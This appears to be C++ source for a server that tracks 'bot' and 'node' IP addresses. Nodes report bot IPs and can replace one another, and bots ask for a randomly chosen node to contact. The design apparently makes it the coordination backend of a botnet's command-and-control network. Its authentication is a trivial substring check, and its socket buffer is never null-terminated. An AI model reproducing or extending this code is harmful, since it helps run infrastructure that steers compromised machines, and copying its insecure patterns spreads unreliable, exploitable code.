#include "client.h"
#include "logger.h"
#include "main.h"

#include <nlohmann/json.hpp>

unsigned __stdcall c_client::handle_session(void *data)
{
	c_client::params *p_data = (c_client::params*)data;
	c_client::params params = *p_data;

	SOCKET client_socket = params.client_socket;
	SOCKADDR_IN client_info = params.client_info;

	char message_buffer[8192];
	recv(client_socket, message_buffer, sizeof(message_buffer), 0);

	if (c_client::is_valid_request(std::string(message_buffer)))
	{
		auto json = nlohmann::json::parse(std::string(message_buffer));

		if (json["request"] == "update_ips")
		{
			c_logger::log("Recieved update request from node: " + (std::string)inet_ntoa(client_info.sin_addr));

			for (int i = 0; i < json["ip_amount"]; i++)
			{
				std::string index = "ip" + std::to_string(i + 1);
				std::string current_ip = json["ips"][index];
				
				c_main::bot_ips.push_back(current_ip);
			}


			if (std::find(c_main::node_ips.begin(), c_main::node_ips.end(), (std::string)inet_ntoa(client_info.sin_addr)) == c_main::node_ips.end())
			{
				for(int i = 0; i < c_main::node_ips.size(); i++)
					if (c_main::node_ips[i] == json["node_replaced"])
					{
						c_main::node_ips.push_back((std::string)inet_ntoa(client_info.sin_addr));
						c_main::node_ips.erase(c_main::node_ips.begin() + i);

						std::string node_replaced = json["node_replaced"];
						c_logger::log("New node (" + (std::string)inet_ntoa(client_info.sin_addr) + ") replaced old node (" + node_replaced + ")");
					}
			}

			std::string response = "{\"response\":\"updated\"}";

			char response_buffer[8192];
			strcpy_s(response_buffer, response.c_str());

			send(client_socket, response_buffer, sizeof(response_buffer), 0);
		}
		else if (json["request"] == "get_node")
		{
			c_logger::log("Recieved node location request from bot: " + (std::string)inet_ntoa(client_info.sin_addr));

			std::string node_ip = c_main::node_ips[rand() % c_main::node_ips.size()];
			
			std::string response = "{\"node_ip\":\"" + node_ip + "\"}";

			char response_buffer[8192];
			strcpy_s(response_buffer, response.c_str());

			send(client_socket, response_buffer, sizeof(response_buffer), 0);
		}
	}
	else
	{
		c_logger::log("Recieved invalid request from: " + (std::string)inet_ntoa(client_info.sin_addr));
	}
	
	memset(message_buffer, 0, sizeof(message_buffer));

	return 0;
}

bool c_client::is_valid_request(std::string request)
{
	try
	{
		auto json = nlohmann::json::parse(request);

		if (json["auth"].get<std::string>().find("z") != std::string::npos && json["auth"].get<std::string>().find("L") != std::string::npos &&
			json["auth"].get<std::string>().find("|") != std::string::npos && json["auth"].get<std::string>().find("jM") != std::string::npos)
			return true;
	}
	catch (nlohmann::detail::parse_error e)
	{
		c_logger::error(e.what());
		return false;
	}
	

	return false;
}

